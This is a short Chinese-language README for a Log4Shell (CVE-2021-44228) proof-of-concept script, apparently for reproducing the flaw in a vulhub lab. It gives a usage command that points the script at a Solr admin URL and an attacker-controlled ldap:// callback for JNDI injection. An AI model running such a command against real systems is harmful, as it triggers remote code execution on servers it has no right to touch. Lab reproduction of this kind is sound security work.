# log4j-poc
### 此漏洞基于vulhub进行的复现
对于有log4j 漏洞网站进行get请求的复现，如果为POST请求此脚本还不支持
### 使用说明
```
python CVE-2021-44228.PY -u 目标url -r 远程ldap调用对象
示例
python CVE-2021-44228.py -u http://10.0.0.135:8983/solr/admin/cores -r ldap://10.0.0.135:1389/dduxvr
```
